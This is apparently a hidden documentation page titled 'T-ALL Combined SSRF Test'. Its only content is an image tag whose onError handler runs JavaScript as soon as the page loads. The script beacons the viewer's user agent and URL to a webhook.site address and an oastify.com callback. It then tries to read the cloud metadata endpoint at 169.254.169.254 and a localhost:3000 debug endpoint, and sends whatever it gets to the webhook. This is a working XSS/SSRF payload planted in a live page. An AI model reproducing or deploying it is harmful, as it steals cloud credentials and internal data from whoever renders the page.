---
title: T-ALL Combined SSRF Test
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<img src="x" onError="(async()=>{
  const wh='https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355';
  const cb='http://gue00np1ce9xs7l8feg9yz0j6ac20r.oastify.com';
  try{
    const ua=navigator.userAgent;
    const loc=window.location.href;
    await fetch(wh+'?t=xss_confirm&ua='+encodeURIComponent(ua)+'&loc='+encodeURIComponent(loc));
    await fetch(cb+'/http-confirm?ua='+encodeURIComponent(ua));
  }catch(e){}
  try{
    const r=await fetch('http://169.254.169.254/latest/meta-data/',{signal:AbortSignal.timeout(3000)});
    const d=await r.text();
    await fetch(wh+'?t=imds_hit&d='+encodeURIComponent(d));
  }catch(e){
    await fetch(wh+'?t=imds_blocked&e='+encodeURIComponent(e.toString()));
  }
  try{
    const r=await fetch('http://localhost:3000/json',{signal:AbortSignal.timeout(3000)});
    const d=await r.text();
    await fetch(wh+'?t=bless_hit&d='+encodeURIComponent(d.slice(0,1000)));
  }catch(e){
    await fetch(wh+'?t=bless_blocked&e='+encodeURIComponent(e.toString()));
  }
})()" />
`}</HTMLBlock>
